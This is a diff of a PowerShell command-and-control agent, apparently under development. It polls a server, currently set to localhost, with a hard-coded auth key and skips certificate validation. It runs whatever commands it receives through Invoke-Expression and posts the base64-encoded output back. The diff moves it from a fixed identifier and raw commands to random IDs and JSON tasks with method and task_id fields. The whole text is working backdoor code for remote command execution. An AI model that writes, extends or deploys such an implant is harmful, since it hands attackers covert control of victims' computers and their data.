@@ -1,5 +1,5 @@
 $secret_key = "RkRrcitEQ3AkSEIvYW0kQVUmQkE3N151dTdUPVJkQW9OJk07RnUw"
-$identifier = "5617363956173639561736395617363956173638398399"
+$identifier = Get-Random -Max 100000000000000000
 $base_url = "https://127.0.0.1:8181/"
 $sleep_time = 1
 
@@ -8,14 +8,14 @@ $sleep_time = 1
 $headers =@{
     "X-Auth"=$secret_key
     "Identifier"=$identifier
+    "Content-Type" = "application/json"
 }
 
 while ($true) {
     Start-Sleep -second $sleep_time
     $command_url ="{0}command" -f $base_url
     $output = Invoke-RestMethod -Uri $command_url -Headers $headers -SkipCertificateCheck
-    $output = "$output"
-    if ($output -eq "registration_error") {
+    if ("$output" -eq "registration_error") {
         $uri = "{0}checkin" -f $base_url
         Invoke-RestMethod -Uri $uri -Headers $headers -SkipCertificateCheck > $null 
     }else{
@@ -23,16 +23,36 @@ while ($true) {
             $url = "{0}output" -f $base_url
             $stdout = ""
             $stderr = ""
-            $base64_command = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
-            $command_output = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64_command))
+            Write-Host $output
+            $method = $output.method
+            $task_id = $output.task_id
+            $arguments = $output.arguments
+            Write-Host "$method,$task_id,$arguments"
             try {
-                $command_output = Invoke-Expression "$command_output"
-                $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command_output))
-                Invoke-RestMethod -Uri $url -Method Post -Body $base64_output -Headers $headers -SkipCertificateCheck > $null 
+                if ($method -eq "psh"){
+                    $command_output = Invoke-Expression "$arguments"
+                    $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command_output))
+                    $data_table = @{
+                        task_id=$task_id
+                        output=$base64_output
+                    } | ConvertTo-Json
+                    Invoke-RestMethod -Uri $url -Method Post -Body $data_table -Headers $headers -SkipCertificateCheck > $null 
+                }else{
+                    $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Method not supported"))
+                    $data_table = @{
+                        task_id=$task_id
+                        output=$base64_output
+                    } | ConvertTo-Json
+                    Invoke-RestMethod -Uri $url -Method Post -Body $data_table -Headers $headers -SkipCertificateCheck > $null 
+                }
             }catch{
                 $error_details = "$_.ErrorDetails.Message.message"
                 $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($error_details))
-                Invoke-RestMethod -Uri $url -Method Post -Body $base64_output -Headers $headers -SkipCertificateCheck > $null
+                $data_table = @{
+                    task_id=$task_id
+                    output=$base64_output
+                } | ConvertTo-Json
+                Invoke-RestMethod -Uri $url -Method Post -Body $data_table -Headers $headers -SkipCertificateCheck > $null
             }
 
         }
